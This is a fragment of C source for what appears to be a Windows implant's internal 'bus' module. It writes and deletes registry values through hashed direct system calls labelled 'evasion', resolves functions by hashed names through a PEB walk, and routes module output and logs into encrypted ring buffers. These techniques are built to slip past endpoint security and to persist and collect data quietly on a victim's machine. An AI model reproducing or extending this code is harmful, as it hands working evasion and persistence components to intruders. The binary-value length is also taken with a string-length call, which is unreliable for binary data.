            data_size += sizeof(WCHAR);
        data_size += sizeof(WCHAR);  /* Include null terminator */
    } else if (type == 4) {
        /* REG_DWORD */
        data_size = sizeof(DWORD);
    } else if (type == 11) {
        /* REG_QWORD */
        data_size = sizeof(QWORD);
    } else {
        /* REG_BINARY (3) or other: use output ring entry max as limit */
        /* Caller must provide length through the bus protocol */
        data_size = (DWORD)spec_strlen((const char *)data);
    }

    status = evasion_syscall(bus_get_evasion(),
        HASH_NTSETVALUEKEY,
        key, &us_value, (ULONG)0, (ULONG)type,
        (PVOID)data, (ULONG)data_size);

    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, key);
    return NT_SUCCESS(status);
}

static BOOL bus_reg_delete(DWORD hive, const char *path, const char *value) {
    if (!path || !value)
        return FALSE;

    WCHAR wpath[BUS_MAX_REG_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_reg_path(hive, path, wpath, &us_path))
        return FALSE;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE key = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTOPENKEY, &key, (ULONG)KEY_SET_VALUE, &oa);

    if (!NT_SUCCESS(status))
        return FALSE;

    WCHAR wvalue[BUS_MAX_REG_PATH_WCHARS];
    UNICODE_STRING us_value;
    if (!bus_build_value_name(value, wvalue, &us_value)) {
        evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, key);
        return FALSE;
    }

    status = evasion_syscall(bus_get_evasion(),
        HASH_NTDELETEVALUEKEY, key, &us_value);

    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, key);
    return NT_SUCCESS(status);
}

/* ------------------------------------------------------------------ */
/*  Output — write module results to encrypted ring buffer             */
/* ------------------------------------------------------------------ */

static BOOL bus_output(const BYTE *data, DWORD len, DWORD type) {
    BOOL ok = output_write(&g_bus_ctx.output_ring, data, len, type);
    return ok;
}

static BOOL bus_output_to_slot(DWORD slot_idx, const BYTE *data, DWORD len, DWORD type) {
#ifdef TEST_BUILD
    (void)slot_idx;
    return bus_output(data, len, type);
#else
    MODULE_MANAGER *mgr = modmgr_get();
    if (!mgr || !mgr->initialized || slot_idx >= MODMGR_MAX_SLOTS)
        return bus_output(data, len, type);

    return output_write(&mgr->output_rings[slot_idx], data, len, type);
#endif
}

static BOOL bus_output_slot0(const BYTE *data, DWORD len, DWORD type) {
    return bus_output_to_slot(0, data, len, type);
}

static BOOL bus_output_slot1(const BYTE *data, DWORD len, DWORD type) {
    return bus_output_to_slot(1, data, len, type);
}

static BOOL bus_output_slot2(const BYTE *data, DWORD len, DWORD type) {
    return bus_output_to_slot(2, data, len, type);
}

static BOOL bus_output_slot3(const BYTE *data, DWORD len, DWORD type) {
    return bus_output_to_slot(3, data, len, type);
}

static BOOL bus_output_slot4(const BYTE *data, DWORD len, DWORD type) {
    return bus_output_to_slot(4, data, len, type);
}

static BOOL bus_output_slot5(const BYTE *data, DWORD len, DWORD type) {
    return bus_output_to_slot(5, data, len, type);
}

static BOOL bus_output_slot6(const BYTE *data, DWORD len, DWORD type) {
    return bus_output_to_slot(6, data, len, type);
}

static BOOL bus_output_slot7(const BYTE *data, DWORD len, DWORD type) {
    return bus_output_to_slot(7, data, len, type);
}

/* ------------------------------------------------------------------ */
/*  Resolve — get a clean function pointer via PEB walk                */
/* ------------------------------------------------------------------ */

static PVOID bus_resolve(const char *dll_name, const char *func_name) {
    if (!dll_name || !func_name)
        return NULL;

    DWORD mod_hash = spec_djb2_hash(dll_name);
    DWORD func_hash = spec_djb2_hash(func_name);

    PVOID module_base = find_module_by_hash(mod_hash);
    if (!module_base)
        return NULL;

    return find_export_by_hash(module_base, func_hash);
}

/* ------------------------------------------------------------------ */
/*  Logging — write log entries as OUTPUT_TEXT to ring buffer           */
/* ------------------------------------------------------------------ */

static void bus_log(DWORD level, const char *msg) {
    if (!msg)
        return;

    /* Format: [LEVEL] message */
    static const char *prefixes[] = { "[DBG] ", "[INF] ", "[WRN] ", "[ERR] " };
    const char *prefix = (level <= LOG_ERROR) ? prefixes[level] : prefixes[LOG_INFO];

    DWORD prefix_len = (DWORD)spec_strlen(prefix);
    DWORD msg_len = (DWORD)spec_strlen(msg);
    DWORD total = prefix_len + msg_len;

    if (total > BUS_OUTPUT_ENTRY_MAX)
        total = BUS_OUTPUT_ENTRY_MAX;

    BYTE buf[BUS_OUTPUT_ENTRY_MAX];
    spec_memcpy(buf, prefix, prefix_len);

    DWORD copy_len = total - prefix_len;
    spec_memcpy(buf + prefix_len, msg, copy_len);

    output_write(&g_bus_ctx.output_ring, buf, total, OUTPUT_TEXT);
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
void bus_test_set_ring_key(OUTPUT_RING *ring, const BYTE key[32],
                           const BYTE nonce[12]) {
    if (!ring)
        return;
    spec_memcpy(ring->enc_key, key, 32);
    spec_memcpy(ring->enc_nonce, nonce, 12);
}
#endif
